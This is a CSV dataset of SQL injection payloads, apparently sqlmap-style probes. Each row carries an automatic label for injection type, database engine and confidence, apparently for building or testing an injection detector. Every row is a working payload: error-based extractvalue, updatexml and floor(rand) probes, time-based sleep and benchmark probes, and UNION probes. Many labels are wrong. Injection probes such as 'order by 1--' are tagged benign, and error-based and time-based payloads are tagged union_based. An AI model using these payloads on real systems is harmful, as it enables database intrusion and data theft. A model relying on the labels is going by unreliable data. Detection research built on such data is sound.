id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
18405,1 order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 14 chars.,2
18425,end if,benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 6 chars.,2
18438,1%' ) ) ) order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 21 chars.,2
18442,1' in boolean mode ) order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 33 chars.,2
18451,"1'|| ( select 'jbgg' from dual where 1986 = 1986 union all select null,null,null,null,null,null,null,null,null,null#",union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,2
18457,"1"" ) order by 1--",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 17 chars.,2
18463,-3497' order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 18 chars.,2
18466,1' ) ) ) order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 20 chars.,2
18468,"1'|| ( select 'zpwe' from dual where 7743 = 7743 union all select null,null#",union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,2
18490,"1'+ ( select 'aphz' where 1933 = 1933 union all select null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 85 chars.,2
18435,( 2329 = 4209 ) *1,benign,generic,0.5,. Payload length: 18 chars.,2
18401,"1%' ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( '%' = '",error_based,mysql,1.0,"Signals: 'extractvalue', 'benchmark', 'concat'; Error-based SQLi (extractvalue/updatexml); DB: mysql",1
18508,"1%' ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,1.0,"Signals: 'extractvalue', 'benchmark', 'concat'; Error-based SQLi (extractvalue/updatexml); DB: mysql",1
18578,"1 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,1.0,"Signals: 'extractvalue', 'benchmark', 'concat'; Error-based SQLi (extractvalue/updatexml); DB: mysql",1
18404,end and ( ( 'vkle' = 'vkle,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 26 chars.,1
18449,end and 'blit' = 'blit,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,1
18484,end and ( ( ( 'hglq' like 'hglq,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 31 chars.,1
18580,"end and ( ""nuix"" like ""nuix",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 27 chars.,1
18409,1 ) ) as xmac where 7692 = 7692,benign,generic,0.5,. Payload length: 31 chars.,1
18413,"1"" ) ) as xxdm where 4818 = 4818",benign,generic,0.5,. Payload length: 32 chars.,1
18453,"1"" where 8016 = 8016",benign,generic,0.5,. Payload length: 20 chars.,1
18479,"1"" ) ) as fjtv where 8904 = 8904",benign,generic,0.5,. Payload length: 32 chars.,1
18488,"1"" ) as qnmd where 5642 = 5642",benign,generic,0.5,. Payload length: 30 chars.,1
18400,"1"" procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ""dsae"" = ""dsae",union_based,generic,1.0,"Signals: 'extractvalue', 'concat', 'case'; UNION-based payload detected",0
18402,"1"" or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ""gknn"" like ""gknn",union_based,mysql,1.0,"Signals: 'extractvalue', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
18406,"1 ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( 1915 = 1915",time_blind,mysql,1.0,"Signals: 'elt', 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql",0
18408,"1' ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( 'xwsb' = 'xwsb",time_blind,mysql,1.0,"Signals: 'elt', 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql",0
18412,"1' ) as wpom where 2620 = 2620 and elt ( 3114 = 3114,sleep ( 5 ) ) #",time_blind,mysql,1.0,"Signals: 'elt', 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql",0
18415,"-2110' or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",union_based,generic,1.0,"Signals: 'concat', 'case'; UNION-based payload detected",0
18418,"1"" where 5334 = 5334 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'exp'; UNION-based payload detected; DB: mysql",0
18419,1'+ ( select ophz where 9158 = 9158 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) ) +',union_based,mysql,1.0,"Signals: 'sleep', 'rlike'; UNION-based payload detected; DB: mysql",0
18420,"-7248' ) where 4626 = 4626 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",union_based,generic,1.0,"Signals: 'concat', 'case'; UNION-based payload detected",0
18426,"1'+ ( select sfuq where 8094 = 8094 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) ) +'",union_based,mysql,1.0,"Signals: 'extractvalue', 'benchmark', 'concat'; UNION-based payload detected; DB: mysql",0
18431,"-9929' ) as gbtc where 8162 = 8162 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",union_based,generic,1.0,"Signals: 'concat', 'case'; UNION-based payload detected",0
18432,"1'+ ( select rdpe where 6553 = 6553 or elt ( 6272 = 6272,sleep ( 5 ) ) ) +'",union_based,mysql,1.0,"Signals: 'elt', 'sleep'; UNION-based payload detected; DB: mysql",0
18434,"-1588%"" ) ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",union_based,generic,1.0,"Signals: 'concat', 'case'; UNION-based payload detected",0
18436,"1' ) where 1027 = 1027 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'char'; UNION-based payload detected; DB: mysql",0
18439,"1 ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( 6690 = 6690",union_based,mysql,1.0,"Signals: 'updatexml', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
18440,1 ) as hlcn where 1165 = 1165 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,union_based,mysql,1.0,"Signals: 'sleep', 'rlike'; UNION-based payload detected; DB: mysql",0
18441,"1 ) where 6374 = 6374 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",union_based,mysql,1.0,"Signals: 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
18445,"1 ) as qjjm where 3850 = 3850 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'char'; UNION-based payload detected; DB: mysql",0
18446,"-6170 ) ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",union_based,generic,1.0,"Signals: 'concat', 'case'; UNION-based payload detected",0
18447,"1"" ) ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( ""tiet"" like ""tiet",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'exp'; UNION-based payload detected; DB: mysql",0
18448,"1"" ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( ""gmld"" like ""gmld",union_based,mysql,1.0,"Signals: 'updatexml', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
18450,"1' ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( 'beju' like 'beju",union_based,mysql,1.0,"Signals: 'updatexml', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
18456,"1 ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) )",union_based,mysql,1.0,"Signals: 'extractvalue', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
18461,"1'|| ( select 'mwmn' where 5112 = 5112 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) ) ||'",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'char'; UNION-based payload detected; DB: mysql",0
18462,"-9845"" ) as xpis where 1936 = 1936 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",union_based,generic,1.0,"Signals: 'concat', 'case'; UNION-based payload detected",0
18472,"1'+ ( select 'cstd' where 9326 = 9326 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) ) +'",union_based,mysql,1.0,"Signals: 'extractvalue', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
18477,"1"" ) ) as krro where 1050 = 1050 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) --",union_based,generic,1.0,"Signals: 'extractvalue', 'concat', 'case'; UNION-based payload detected",0
18485,"1 ) ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( 2230 = 2230",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'exp'; UNION-based payload detected; DB: mysql",0
